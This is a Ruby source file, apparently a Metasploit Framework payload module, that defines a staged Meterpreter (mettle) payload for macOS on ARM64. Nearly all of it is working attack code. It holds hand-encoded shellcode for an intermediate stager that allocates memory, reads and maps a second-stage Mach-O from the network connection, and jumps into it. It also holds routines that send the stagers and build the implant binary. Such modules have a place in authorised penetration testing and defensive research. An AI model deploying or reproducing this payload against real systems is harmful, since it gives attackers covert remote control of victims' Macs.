##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OSX Meterpreter',
        'Description' => 'Inject the mettle server payload (staged)',
        'Platform' => 'osx',
        'Author' => [
          'parchedmind',  # osx_runbin
          'nologic',      # shellcc
          'timwr',        # metasploit integration
          'usiegl00'      # aarch64
        ],
        'References' => [
          [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],
          [ 'URL', 'https://github.com/nologic/shellcc' ]
        ],
        'Arch' => ARCH_AARCH64,
        'License' => MSF_LICENSE,
        'Session' => Msf::Sessions::Meterpreter_aarch64_OSX,
        'Convention' => 'sockedi'
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    stager_file = File.join(Msf::Config.data_directory, 'meterpreter', 'aarch64_osx_stage')
    data = File.binread(stager_file)
    macho = Msf::Payload::MachO.new(data)
    output_data = macho.flatten
    entry_offset = macho.entrypoint
    # external/source/shellcode/osx/aarch64/stage_mettle.s
    midstager = [
      # <_main>:
      0xaa1f03e0, # mov	x0, xzr
      0x10000861, # adr	x1, #268
      0xf9400021, # ldr	x1, [x1]
      0xd2800042, # mov	x2, #2
      0xd2820043, # mov	x3, #4098
      0xaa1f03e4, # mov	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x58000870, # ldr	x16, 0x100003f98 <entry_offset+0x8>
      0xd4000001, # svc	#0
      0xaa0003ea, # mov	x10, x0
      0xaa0d03e0, # mov	x0, x13
      0xaa0a03e1, # mov	x1, x10
      0x10000702, # adr	x2, #224
      0xf9400042, # ldr	x2, [x2]
      0xd2800803, # mov	x3, #64
      0xaa1f03e4, # mov	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x58000770, # ldr	x16, 0x100003fa0 <entry_offset+0x10>
      0xd4000001, # svc	#0
      0xaa0a03e0, # mov	x0, x10
      0x10000601, # adr	x1, #192
      0xf9400021, # ldr	x1, [x1]
      0xd28000a2, # mov	x2, #5
      0x580006f0, # ldr	x16, 0x100003fa8 <entry_offset+0x18>
      0xd4000001, # svc	#0
      0xaa1f03e0, # mov	x0, xzr
      0x10000581, # adr	x1, #176
      0xf9400021, # ldr	x1, [x1]
      0xd2800062, # mov	x2, #3
      0xd2820043, # mov	x3, #4098
      0xaa1f03e4, # mov	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x58000550, # ldr	x16, 0x100003f98 <entry_offset+0x8>
      0xd4000001, # svc	#0
      0xaa0003eb, # mov	x11, x0
      0xaa0d03e0, # mov	x0, x13
      0xaa0b03e1, # mov	x1, x11
      0x10000422, # adr	x2, #132
      0xf9400042, # ldr	x2, [x2]
      0xd2800803, # mov	x3, #64
      0xaa1f03e4, # mov	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x58000450, # ldr	x16, 0x100003fa0 <entry_offset+0x10>
      0xd4000001, # svc	#0
      0x10000380, # adr	x0, #112
      0xf9400000, # ldr	x0, [x0]
      0x8b0a0000, # add	x0, x0, x10
      0x100002ea, # adr	x10, #92
      0xf940014a, # ldr	x10, [x10]
      0xaa0b03ec, # mov	x12, x11
      0xaa0003ef, # mov	x15, x0
      0xaa1f03e0, # mov	x0, xzr
      0xd2a00081, # mov	x1, #262144
      0xd2800062, # mov	x2, #3
      0xd2820043, # mov	x3, #4098
      0xaa1f03e4, # mov	x4, xzr
      0xaa1f03e5, # mov	x5, xzr
      0x58000230, # ldr	x16, 0x100003f98 <entry_offset+0x8>
      0xd4000001, # svc	#0
      0x91408000, # add	x0, x0, #32, lsl #12    ; =131072
      0x9100001f, # mov	sp, x0
      0xaa0d03e0, # mov	x0, x13
      0xd63f01e0, # blr	x15
      # <failed>:
      0xd2800000, # mov	x0, #0
      0x58000210, # ldr	x16, 0x100003fb0 <entry_offset+0x20>
      0xd4000001, # svc	#0
      0xd503201f, # nop
      0xd503201f, # nop
      # <stager_size>:
      output_data.length, # udf	#16962
      0x00000000, # udf	#17219
      # <payload_size>:
      payload.length, # udf	#17476
      0x00000000, # udf	#17733
      # <entry_offset>:
      entry_offset, # udf	#17990
      0x00000000, # udf	#18247
      0x020000c5, # <unknown>
      0x00000000, # udf	#0
      0x0200001d, # <unknown>
      0x00000000, # udf	#0
      0x0200004a, # <unknown>
      0x00000000, # udf	#0
      0x02000001, # <unknown>
      0x00000000, # udf	#0
    ].pack('V*')
    print_status("Transmitting first stager...(#{midstager.length} bytes)")
    conn.put(midstager)
    midstager.length

    Rex.sleep(0.1)
    print_status("Transmitting second stager...(#{output_data.length} bytes)")
    conn.put(output_data) == output_data.length
  end

  def generate_stage(opts = {})
    config_opts = { scheme: 'tcp' }.merge(mettle_logging_config(opts))
    mettle_macho = MetasploitPayloads::Mettle.new('aarch64-apple-darwin',
                                                  generate_config(opts.merge(config_opts))).to_binary :exec
    mettle_macho[0] = 'b'
    mettle_macho
  end
end
